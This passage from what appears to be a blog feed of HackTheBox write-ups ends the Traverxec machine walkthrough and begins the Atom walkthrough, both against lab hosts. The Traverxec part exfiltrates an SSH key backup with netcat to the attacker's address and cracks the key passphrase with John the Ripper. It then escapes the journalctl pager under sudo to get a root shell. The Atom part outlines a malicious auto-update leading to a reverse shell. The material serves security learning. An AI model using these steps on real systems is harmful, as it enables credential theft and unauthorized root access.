</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/.ssh
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/user.txt
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root david <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/user.txt
</span></span></code></pre></div><p>Then, when I type <code>public_www</code> (from nostromo config), the tab completion confirms that the folder is there. With <code>r-x</code>, I can use <code>ls -lR</code> command to list all the available contents recursively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/public_www
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/public_www
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -lR /home/david/public_www
</span></span><span class="line"><span class="cl">/home/david/public_www:
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david  <span class="m">402</span> Oct <span class="m">25</span>  <span class="m">2019</span> index.html
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> protected-file-area
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/home/david/public_www/protected-file-area:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david <span class="m">1915</span> Oct <span class="m">25</span>  <span class="m">2019</span> backup-ssh-identity-files.tgz
</span></span></code></pre></div><p>The <code>backup-ssh-identity-files.tgz</code> seems interesting, I will grab that to my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz <span class="p">|</span> nc 10.10.14.34 <span class="m">53</span>
</span></span></code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span> &gt; loot/backup-ssh-identity-files.tgz
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52728</span>
</span></span></code></pre></div><h4 id="passphrase-crack">Passphrase crack</h4>
<p>The backup file contains a set of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ tar -xvf backup-ssh-identity-files.tgz 
</span></span><span class="line"><span class="cl">home/david/.ssh/
</span></span><span class="line"><span class="cl">home/david/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">home/david/.ssh/id_rsa
</span></span><span class="line"><span class="cl">home/david/.ssh/id_rsa.pub
</span></span></code></pre></div><p>But, it is protected with a passphrase.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «ssh-keys» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ ssh -i id_rsa david@traverxec.htb 
</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;id_rsa&#39;</span>: 
</span></span><span class="line"><span class="cl">david@traverxec.htb<span class="err">&#39;</span>s password:
</span></span></code></pre></div><p>So I will convert the key to crackable format hash using <code>ssh2john</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ /usr/share/john/ssh2john.py id_rsa &gt; david_rsa.hash 
</span></span><span class="line"><span class="cl">→ kali@kali «ssh-keys» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ cat david_rsa.hash 
</span></span><span class="line"><span class="cl">id_rsa:<span class="nv">$sshng$1$16$477</span>EEFFBA56F9D283D349033D5D08C4F<span class="nv">$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672</span>...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p><code>JtR</code>  recovers the passphrase to <code>hunter</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./john.exe hashes/traverxec-david-rsa.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                    
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64<span class="o">])</span>
</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES<span class="o">])</span> is <span class="m">0</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="cl">Note: This format may emit <span class="nb">false</span> positives, so it will keep trying even after
</span></span><span class="line"><span class="cl">finding a possible candidate.
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">hunter           <span class="o">(</span>id_rsa<span class="o">)</span>
</span></span></code></pre></div><h4 id="ssh---david">SSH - david</h4>
<p>The key and the passphrase are work for user david.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ ssh -i ssh-keys/david_rsa david@traverxec.htb
</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;ssh-keys/david_rsa&#39;</span>: 
</span></span><span class="line"><span class="cl">Linux traverxec 4.19.0-6-amd64 <span class="c1">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
</span></span><span class="line"><span class="cl">Last login: Tue Jul <span class="m">13</span> 06:54:56 <span class="m">2021</span> from 10.10.16.7
</span></span><span class="line"><span class="cl">david@traverxec:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
</span></span></code></pre></div><p>User flag is done here</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">60</span>
</span></span><span class="line"><span class="cl">drwx--x--x <span class="m">6</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:57 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root  root   <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> david david <span class="m">18992</span> Jul <span class="m">13</span> 05:43 <span class="m">47163</span>
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root  root      <span class="m">9</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david   <span class="m">220</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david  <span class="m">3544</span> Jul <span class="m">13</span> 06:57 .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> bin
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:56 .local
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david   <span class="m">807</span> Oct <span class="m">25</span>  <span class="m">2019</span> .profile
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> public_www
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> .ssh
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root  david    <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> user.txt
</span></span><span class="line"><span class="cl">david@traverxec:~$ cat user.txt 
</span></span><span class="line"><span class="cl">7db0...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In david&rsquo;s home directory, there is a folder called <code>bin</code>.  Under this <code>bin</code> folder, there is a bash script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~$ ls -l bin/
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> david david <span class="m">802</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.head
</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> david david <span class="m">363</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.sh
</span></span></code></pre></div><p>When I run the script, I get the following results:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~/bin$ ./server-stats.sh 
</span></span><span class="line"><span class="cl">                                                                          .----.
</span></span><span class="line"><span class="cl">                                                              .---------. <span class="p">|</span> <span class="o">==</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">   Webserver Statistics and Data                              <span class="p">|</span>.-<span class="s2">&#34;&#34;&#34;&#34;&#34;-.| |----|
</span></span></span><span class="line"><span class="cl"><span class="s2">         Collection Script                                    ||       || | == |
</span></span></span><span class="line"><span class="cl"><span class="s2">          (c) David, 2019                                     ||       || |----|
</span></span></span><span class="line"><span class="cl"><span class="s2">                                                              |&#39;-.....-&#39;| |::::|
</span></span></span><span class="line"><span class="cl"><span class="s2">                                                              &#39;&#34;&#34;)---(&#34;&#34;&#39; |___.|
</span></span></span><span class="line"><span class="cl"><span class="s2">                                                             /:::::::::::\&#34;    &#34;</span>
</span></span><span class="line"><span class="cl">                                                            /:::<span class="o">=======</span>:::<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>                                                        jgs <span class="s1">&#39;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#39;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Load:  18:24:49 up 17:04,  <span class="m">1</span> user,  load average: 0.13, 0.04, 0.01
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">Open nhttpd sockets: <span class="m">0</span>
</span></span><span class="line"><span class="cl">Files in the docroot: <span class="m">117</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">Last <span class="m">5</span> journal log lines:
</span></span><span class="line"><span class="cl">-- Logs begin at Tue 2021-07-13 01:20:43 EDT, end at Tue 2021-07-13 18:24:49 EDT. --
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:02 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nv">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span><span class="m">33</span> <span class="nv">euid</span><span class="o">=</span><span class="m">0</span> <span class="nv">tty</span><span class="o">=</span>/dev/pts/0 <span class="nv">ruser</span><span class="o">=</span>www-data <span class="nv">rhost</span><span class="o">=</span>  <span class="nv">user</span><span class="o">=</span>www-data
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: conversation failed
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: auth could not identify password <span class="k">for</span> <span class="o">[</span>www-data<span class="o">]</span>
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: www-data : <span class="nb">command</span> not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/dev/shm <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>list
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec nologin<span class="o">[</span>24564<span class="o">]</span>: Attempted login by UNKNOWN on UNKNOWN
</span></span></code></pre></div><h4 id="sudo-journalctl">Sudo journalctl</h4>
<p>Based on the contents of <code>server-stats.sh</code>, user <code>david</code> seems to be allowed to run <code>journalctl</code>  with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~/bin$ cat server-stats.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cat /home/david/bin/server-stats.head
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Load: `/usr/bin/uptime`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Last 5 journal log lines:&#34;</span>
</span></span><span class="line"><span class="cl">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service <span class="p">|</span> /usr/bin/cat 
</span></span></code></pre></div><p>But, when I run <code>/usr/bin/sudo /usr/bin/journalctl</code>, it asks for a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> david: 
</span></span><span class="line"><span class="cl">Sorry, try again.
</span></span></code></pre></div><p>Then, I grab this line <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> and run it. This is what I get:</p>
<p><div class="img-container"><img src="imgs/image-20210714052617836.png" alt="image-20210714052617836"  /></div>
</p>
<p>That means I can run the following command with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
</span></span></code></pre></div><p>According to the <a href="https://gtfobins.github.io/gtfobins/journalctl/">GTFOBins</a>, the default pager of <code>journalctl</code> is <code>less</code>. Now since it runs with root privilege, I can escape from the pager using  <code>!/bin/bash</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210714054042963.png" alt="image-20210714054042963"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Atom</title>
      <link>https://fahmifj.github.io/hackthebox/atom/</link>
      <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/atom/</guid>
      <description>Supplying a malicious update definition to Electron-updater</description>
      <content:encoded><![CDATA[<p>Atom brings a cool exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. With write access, a malicious update definition can be placed on the share. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploitation of Electron-Builder app through auto-update.</li>
<li>Redis enumeration</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Msfvenom</li>
<li>Netcat</li>
<li>Impacket</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 07:56 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.237
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">127</span> <span class="o">(</span>0.051s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65529</span> filtered ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65529</span> no-responses
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE      REASON          VERSION
</span></span><span class="line"><span class="cl">80/tcp   open  http         syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp  open  msrpc        syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
</span></span><span class="line"><span class="cl">443/tcp  open  ssl/http     syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds syn-ack ttl <span class="m">127</span> Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">5985/tcp open  http         syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl">6379/tcp open  redis        syn-ack ttl <span class="m">127</span> Redis key-value store
</span></span><span class="line"><span class="cl">Service Info: Host: ATOM<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 153.92 seconds
</span></span></code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-6379---redis">TCP 6379 - Redis</h3>
<p>On Redis, authenticated is required.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «smb» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nc -nv 10.10.10.237 <span class="m">6379</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>?<span class="o">)</span> open
</span></span><span class="line"><span class="cl">INFO
</span></span><span class="line"><span class="cl">-NOAUTH Authentication required.
</span></span></code></pre></div><h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.237 -u <span class="s1">&#39;ANONYMOUS&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Pro <span class="m">19042</span> x64 <span class="o">(</span>name:ATOM<span class="o">)</span> <span class="o">(</span>domain:ATOM<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> ATOM<span class="se">\A</span>NONYMOUS: 
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> Enumerated shares
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             Share           Permissions     Remark
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             -----           -----------     ------
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             ADMIN$                          Remote Admin
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             C$                              Default share
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             IPC$                            Remote IPC
</span></span><span class="line"><span class="cl">SMB         10.10.10.237    <span class="m">445</span>    ATOM             Software_Updates READ,WRITE      
</span></span></code></pre></div><h4 id="software_updates-share">Software_Updates Share</h4>
<p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ smbclient -N //10.10.10.237/Software_Updates
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  client1                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  client2                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  client3                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  UAT_Testing_Procedures.pdf          A    <span class="m">35202</span>  Fri Apr  <span class="m">9</span> 07:18:08 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">4413951</span> blocks of size 4096. <span class="m">1361569</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> recurse on
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> prompt off
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget *
</span></span><span class="line"><span class="cl">getting file <span class="se">\U</span>AT_Testing_Procedures.pdf of size <span class="m">35202</span> as UAT_Testing_Procedures.pdf <span class="o">(</span>121.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 121.5 KiloBytes/sec<span class="o">)</span>
</span></span></code></pre></div><h3 id="tcp-80443---website">TCP 80,443 - Website</h3>
<p>Both port 80 and 443 are display the same site, it&rsquo;s a software company site called &ldquo;Heed Solutions&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210517190515610.png" alt="image-20210517190515610"  /></div>
</p>
<p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210517190532910.png" alt="image-20210517190532910"  /></div>
</p>
<p>I&rsquo;ll add the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 atom.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>After the hostname added, the site still shows the same content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://10.10.10.237/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k http://10.10.10.237/ <span class="p">|</span> wc -c 
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k http://atom.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span><span class="line"><span class="cl">→ root@kali «atom» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://atom.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">7581</span>
</span></span></code></pre></div><h3 id="analysis">Analysis</h3>
<p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «loot» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ file heedv1_setup_1.0.0.exe 
</span></span><span class="line"><span class="cl">heedv1_setup_1.0.0.exe: PE32 executable <span class="o">(</span>GUI<span class="o">)</span> Intel 80386, <span class="k">for</span> MS Windows, Nullsoft Installer self-extracting archive
</span></span></code></pre></div><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p>
<p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «heed_extracted» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ tree
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── <span class="nv">$PLUGINSDIR</span>
</span></span><span class="line"><span class="cl">│   ├── app-64
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">│   │   ├── natives_blob.bin
</span></span><span class="line"><span class="cl">│   │   ├── resources
</span></span><span class="line"><span class="cl">│   │   │   ├── app.asar
</span></span><span class="line"><span class="cl">│   │   │   ├── app-update.yml <span class="c1"># ==&gt; Updater config</span>
</span></span><span class="line"><span class="cl">│   │   │   ├── electron.asar
</span></span><span class="line"><span class="cl">│   │   │   ├── elevate.exe
</span></span><span class="line"><span class="cl">│   │   │   └── inspector
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">73</span> directories, <span class="m">274</span> files
</span></span></code></pre></div><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
